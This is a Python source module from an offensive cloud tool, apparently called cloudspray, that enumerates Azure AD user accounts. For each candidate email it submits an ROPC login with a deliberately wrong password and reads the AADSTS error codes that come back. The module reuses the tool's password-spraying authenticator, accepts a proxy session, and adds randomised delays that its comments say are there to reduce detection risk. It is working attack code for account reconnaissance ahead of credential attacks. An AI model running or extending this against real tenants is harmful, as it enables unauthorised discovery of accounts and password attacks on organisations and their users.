"""Login-based user enumeration via ROPC authentication.

Noisy technique that generates failed login events in the target tenant's logs.
Attempts authentication with a known-wrong password and interprets the resulting
AADSTS error code to determine whether the user account exists.

How it works:
    Azure AD returns distinct error codes depending on *why* an authentication
    attempt failed. By submitting a deliberately wrong password (a random UUID)
    for each candidate email, the AADSTS error code in the response reveals
    whether the account exists:

    - **AADSTS50126** (``INVALID_PASSWORD``) -- the password was wrong, which
      means the account itself is valid. This is the primary "exists" signal.
    - **AADSTS50034** (``USER_NOT_FOUND``) -- no account with that email
      exists in the tenant.
    - **AADSTS50053** (``ACCOUNT_LOCKED``) -- the account is locked out,
      confirming it exists.
    - **AADSTS50057** (``ACCOUNT_DISABLED``) -- the account is disabled but
      still present in the directory.
    - **MFA / CA / expired password codes** -- authentication got far enough
      to evaluate policy, proving the account exists.
    - **SUCCESS** -- the random UUID happened to be the right password (nearly
      impossible, but handled for completeness).

    This technique reuses the same ``Authenticator`` class used by the password
    spraying module, ensuring consistent ROPC implementation and error-code
    parsing across the tool.

Why this technique is useful:
    Login enumeration is the most reliable method -- it works regardless of
    OneDrive provisioning, GetCredentialType throttling, or Teams external
    search policies. However, it is also the noisiest: every probe generates a
    failed sign-in event in the target tenant's Azure AD logs, which may
    trigger alerts. Use this as a last resort when quieter techniques are
    unavailable or inconclusive.

Dependencies:
    - ``cloudspray.spray.auth.Authenticator`` -- handles the actual ROPC
      token request and parses the AADSTS error code into an ``AuthResult``.
    - ``cloudspray.constants.error_codes.AuthResult`` -- enum of all
      recognized AADSTS outcomes.
    - ``cloudspray.state.db.StateDB`` -- result persistence.
    - ``cloudspray.reporting.console.ConsoleReporter`` -- live terminal output.
"""

import random
import time
import uuid

import requests

from cloudspray.constants.error_codes import AuthResult
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.spray.auth import Authenticator
from cloudspray.state.db import StateDB
from cloudspray.state.models import EnumResult
from cloudspray.utils import normalize_email

METHOD_NAME = "login"

# AuthResult values that confirm the account exists. All of these codes mean
# Azure AD recognized the username and proceeded far enough into the
# authentication pipeline to evaluate the password, MFA policy, or account
# status -- none of which would happen for a nonexistent account.
_EXISTS_RESULTS = frozenset({
    AuthResult.INVALID_PASSWORD,            # wrong password, but account is real
    AuthResult.ACCOUNT_LOCKED,              # too many failed attempts, account exists
    AuthResult.ACCOUNT_DISABLED,            # admin-disabled account, still in directory
    AuthResult.VALID_PASSWORD_MFA_REQUIRED,  # password correct, needs MFA step
    AuthResult.VALID_PASSWORD_MFA_ENROLLMENT,  # password correct, MFA not yet set up
    AuthResult.VALID_PASSWORD_CA_BLOCKED,    # password correct, blocked by Conditional Access
    AuthResult.VALID_PASSWORD_EXPIRED,       # password correct but expired
    AuthResult.SUCCESS,                      # password was correct (astronomically unlikely)
})

# AuthResult values that definitively confirm the account does NOT exist.
_NOT_FOUND_RESULTS = frozenset({
    AuthResult.USER_NOT_FOUND,  # AADSTS50034: no matching account in the tenant
})


class LoginEnumerator:
    """Enumerate users via ROPC authentication with a wrong password.

    Noisy technique: generates failed login events in target tenant logs.
    Uses MSAL ROPC with a random garbage password to trigger error codes:
    - AADSTS50126 = user exists (invalid password means user was found)
    - AADSTS50034 = user does not exist
    - AADSTS50053 = account locked (user exists)
    - AADSTS50057 = account disabled (user exists)
    """

    def __init__(
        self,
        domain: str,
        db: StateDB,
        reporter: ConsoleReporter,
        proxy_session: requests.Session | None = None,
    ):
        self._domain = domain
        self._db = db
        self._reporter = reporter
        self._authenticator = Authenticator(domain, proxy_session=proxy_session)

    def _classify_existence(self, auth_result: AuthResult) -> bool | None:
        """Map an AuthResult to an existence determination.

        Returns:
            True if the user definitely exists, False if definitely not,
            None if the result is ambiguous.
        """
        if auth_result in _EXISTS_RESULTS:
            return True
        if auth_result in _NOT_FOUND_RESULTS:
            return False
        return None

    def enumerate(self, usernames: list[str]) -> list[str]:
        """Attempt login with wrong passwords to enumerate users.

        Args:
            usernames: List of email addresses to check.

        Returns:
            List of confirmed existing users.
        """
        confirmed: list[str] = []
        usernames = list(dict.fromkeys(usernames))  # preserve order, remove dupes

        for username in usernames:
            email = normalize_email(username, self._domain)

            # Use a random UUID as the password so it is guaranteed wrong
            fake_password = str(uuid.uuid4())

            attempt = self._authenticator.attempt(email, fake_password)
            existence = self._classify_existence(attempt.result)

            if existence is None:
                self._reporter.debug(
                    f"Ambiguous result for {email}: {attempt.result.value}"
                )
                exists = False
            else:
                exists = existence

            if exists:
                confirmed.append(email)

            result = EnumResult(username=email, method=METHOD_NAME, exists=exists)
            self._db.record_enum_result(result)
            self._reporter.print_enum_result(email, exists, METHOD_NAME)

            # Delay between attempts to reduce detection risk
            time.sleep(random.uniform(1.0, 3.0))

        return confirmed
